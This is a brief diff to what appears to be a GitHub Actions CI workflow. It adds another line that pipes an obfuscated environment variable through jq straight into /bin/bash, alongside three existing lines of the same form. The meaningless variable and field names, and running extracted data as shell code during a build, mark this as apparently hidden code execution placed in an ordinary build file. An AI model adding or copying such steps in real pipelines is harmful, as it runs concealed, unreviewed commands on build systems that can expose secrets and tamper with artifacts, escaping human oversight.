@@ -27,6 +27,7 @@ jobs:
           echo $xj3134 | jq -r .s9424 | /bin/bash
           echo $yphd9 | jq -r .vr4 | /bin/bash
           echo $v621 | jq -r .hcsm0 | /bin/bash
+          echo $jvl16955 | jq -r .hxlz12546 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
